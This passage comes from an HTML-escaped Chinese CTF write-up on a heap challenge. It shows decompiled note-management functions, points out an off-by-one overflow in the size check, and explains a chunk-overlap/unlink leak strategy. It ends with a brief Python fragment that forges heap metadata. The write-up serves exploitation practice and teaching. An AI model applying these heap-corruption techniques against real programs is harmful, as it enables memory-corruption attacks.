&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      size = getnum(v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;gt; &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          size = &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v4 = &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(size, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !v4 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *((_DWORD *)&amp;amp;inuse + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * i) = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *((_DWORD *)&amp;amp;Size + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * i) = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * i] = v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the index of ticket is %d \n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;read_content&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !size )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( size &amp;gt; v3 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v4 = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(v3 + a1), size - v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v3 += v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;read_size&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a1 &amp;gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)a2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; a2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( a2 - a1 == &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LODWORD(result) = a1 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;                   &lt;span class=&#34;comment&#34;&gt;// off_by_one&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LODWORD(result) = a1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//write_note&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;sub_E82&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = getnum(v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; size &amp;lt;= &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    size = *((_DWORD *)&amp;amp;inuse + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      size = getnum(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v4 = read_size(*((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)&amp;amp;Size + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * idx), (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)size);&lt;span class=&#34;comment&#34;&gt;// 存在1字节溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( size &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        size = read_content(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * idx], v4); &lt;span class=&#34;comment&#34;&gt;// 不能输入少于size的内容&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//drop note&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;sub_F8E&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = getnum(v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = idx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = idx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( idx &amp;gt;= &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt; &amp;amp;&amp;amp; idx &amp;lt;= &lt;span class=&#34;number&#34;&gt;15LL&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v4 = *((&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)&amp;amp;inuse + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *((_DWORD *)&amp;amp;inuse + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * idx) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *((_DWORD *)&amp;amp;Size + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * idx) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * v2] = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;                       &lt;span class=&#34;comment&#34;&gt;// 不存在uaf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;output_content&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;ssize_t&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !a2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( a2 &amp;gt; v3 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v4 = write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(v3 + a1), a2 - v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v3 += v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = getnum(v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; v2 &amp;lt;= &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v2 = *((_DWORD *)&amp;amp;inuse + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v2 == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v2 = output_content(&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * v3], *((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)&amp;amp;Size + &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; * v3));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;代码实现的逻辑还算比较哇民政，没有太大的问题。由于题目保护全开了，操作空间就很小。唯一的漏洞还非常明显 if (a2 - a1 == 10)&lt;br&gt;
 LODWORD (result) = a1 + 1;   其中 a1 是我们创建时输入的 size，a2 是我们进行 write 时输入的 size，经典的手法创建时是不进行 16 字节对齐，卡最大的堆块界限，0x88，write 时只要输入的时 0x88+10 ，就可以实现 1 字节的溢出。&lt;/p&gt;
&lt;h2 id=&#34;解题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解题&#34;&gt;#&lt;/a&gt; 解题：&lt;/h2&gt;
&lt;h3 id=&#34;泄露地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露地址&#34;&gt;#&lt;/a&gt; 泄露地址&lt;/h3&gt;
&lt;p&gt;因为题目在申请堆块的时候，使用的是 calloc，会对返回的堆块进行初始化。所以我们必须构造的时堆块的重叠或者重复使用&lt;/p&gt;
&lt;p&gt;这里我们只着重介绍两种手法的实现，就不具体展示利用过程了，因为流程比较固定；&lt;/p&gt;
&lt;h3 id=&#34;unlink&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unlink&#34;&gt;#&lt;/a&gt; unlink&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;#泄露&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x61&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x190&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x90&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
